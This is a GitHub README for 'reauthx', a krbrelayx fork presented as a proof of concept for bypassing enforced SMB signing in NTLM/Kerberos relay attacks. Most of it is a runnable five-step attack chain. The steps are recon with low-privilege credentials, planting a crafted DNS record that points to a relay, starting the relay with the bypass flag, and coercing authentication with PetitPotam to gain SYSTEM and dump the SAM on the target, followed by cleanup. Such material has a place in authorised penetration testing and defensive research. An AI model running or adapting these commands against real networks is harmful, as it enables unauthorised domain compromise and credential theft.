<div align="center">

# reauthx

**PoC: defeating enforced SMB signing on an SMB relay.**

[![license MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![fork of krbrelayx](https://img.shields.io/badge/fork-krbrelayx-6e40c9.svg)](https://github.com/dirkjanm/krbrelayx)
[![X](https://img.shields.io/badge/%40aas__s3curity-000000?logo=x&logoColor=white)](https://x.com/aas_s3curity)
[![LinkedIn](https://img.shields.io/badge/In-Lyd%C3%A9ric%20Lefebvre-0A66C2?logo=linkedin&logoColor=white)](https://www.linkedin.com/in/lydericlefebvre/)

</div>

---

reauthx is krbrelayx with one extra flag, `--reauth-bypass`. It defeats **enforced SMB signing**, so a
relay still reaches a target that requires signing, like a Domain Controller.

Write-up: [Defeating enforced SMB signing](https://blackfield.ch/blog/defeating-enforced-smb-signing/).

## Run

```bash
pip install -r requirements.txt
```

Example against a signing-required host `FS01` (`10.0.0.10`): `user1`/`user2` are two low-priv accounts
you control, the DC at `10.0.0.5` holds the DNS zone, the relay listens on `10.0.0.50`. `nxc`, `bloodyAD`
and `PetitPotam.py` are external tools, not shipped here.

```bash
# 1. recon: signing enforced? where in the patch window?
nxc smb 10.0.0.10 -u user1 -p Passw0rd1 -d AD.LOCAL -M reauth_swap -o PROBE_USER=user2 PROBE_PASS=Passw0rd2
python3 patchcheck.py 'AD.LOCAL/user1:Passw0rd1@10.0.0.10' --probe 'user2:Passw0rd2'

# 2. point a DNS record at the relay
NAME="$(python3 coerce_name.py fs01.ad.local --mode unicode --raw)"
bloodyAD -u user1 -p Passw0rd1 -d ad.local --host dc01.ad.local add dnsRecord "$NAME" 10.0.0.50
dig +noidnin +noidnout +short "$NAME.ad.local" @10.0.0.5

# 3. start the relay with the bypass (base session = user2)
sudo python3 krbrelayx.py -t smb://10.0.0.10 --reauth-bypass 'AD.LOCAL/user2:Passw0rd2'

# 4. coerce the target; the relay forwards it onto FS01 (SYSTEM, SAM dump)
python3 PetitPotam.py -d AD.LOCAL -u user1 -p Passw0rd1 "$NAME" 10.0.0.10

# 5. cleanup
bloodyAD -u user1 -p Passw0rd1 -d ad.local --host dc01.ad.local remove dnsRecord "$NAME" 10.0.0.50
```

## Credits

- [krbrelayx](https://github.com/dirkjanm/krbrelayx) by [Dirk-jan Mollema](https://github.com/dirkjanm) ; all the heavy lifting is his.
- [Synacktiv](https://www.synacktiv.com) (CVE-2025-33073, CVE-2026-26128).

## License

MIT, inherited from krbrelayx (see [`LICENSE`](LICENSE)).
